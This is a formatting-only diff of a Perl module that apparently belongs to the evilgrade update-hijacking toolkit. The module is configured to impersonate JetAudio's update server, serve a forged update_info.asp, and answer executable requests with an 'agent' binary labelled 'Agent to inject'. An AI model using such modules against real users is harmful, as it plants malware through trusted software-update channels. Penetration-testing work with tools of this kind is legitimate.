@@ -27,48 +27,49 @@ use Data::Dump qw(dump);
 
 use isrcore::utils;
 
-my $base=
-{
-    'name' => 'JetAudio',
-    'appver' => '<= 1.0.0',
+my $base = {
+    'name'    => 'JetAudio',
+    'appver'  => '<= 1.0.0',
     'version' => '7.5.4.20',
-    'author' => [ 'German Rodriguez < grodriguez +[AT]+ infobytesec.com >' ],
-    'description' => qq{},    
-    'vh' => 'www.jetaudio.com',
-    'request' => [
-		    {
-		    'req' => '/jetaudio_update/update_info.asp', #regex friendly
-		    'type' => 'file', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 0,
-		    'string' => '',
-		    'parse' => 1,
-		    'file' => './include/jet/update_info.asp',
-		    },
-		    {
-		    'req' => '.exe', #regex friendly
-		    'type' => 'agent', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 1,		    
-		    'string' => '',
-		    'parse' => 0,
-		    'file' => ''
-		    },
-		    
+    'author'  => ['German Rodriguez < grodriguez +[AT]+ infobytesec.com >'],
+    'description' => qq{},
+    'vh'          => 'www.jetaudio.com',
+    'request'     => [
+        {   'req' => '/jetaudio_update/update_info.asp',    #regex friendly
+            'type'   => 'file',    #file|string|agent|install
+            'method' => '',        #any
+            'bin'    => 0,
+            'string' => '',
+            'parse'  => 1,
+            'file' => './include/jet/update_info.asp',
+        },
+        {   'req'    => '.exe',     #regex friendly
+            'type'   => 'agent',    #file|string|agent|install
+            'method' => '',         #any
+            'bin'    => 1,
+            'string' => '',
+            'parse'  => 0,
+            'file'   => ''
+        },
+
     ],
-    #Options		    
-    'options' => {  'agent'  => { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject'},
-		    'enable' => { 'val' => 1, 
-			    	  'desc' => 'Status'},
-                    'rnd1'  => {  'val' => 'isrcore::utils::RndNum(5)',
-                                  'hidden' => 1,
-                            	  'dynamic' =>1,
-                            },			    	  
-			    	  
-		 }
+
+    #Options
+    'options' => {
+        'agent' =>
+            { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject' },
+        'enable' => {
+            'val'  => 1,
+            'desc' => 'Status'
+        },
+        'rnd1' => {
+            'val'     => 'isrcore::utils::RndNum(5)',
+            'hidden'  => 1,
+            'dynamic' => 1,
+        },
+
+    }
 };
-
-
 
 ##########################################################################
 # FUNCTION      new
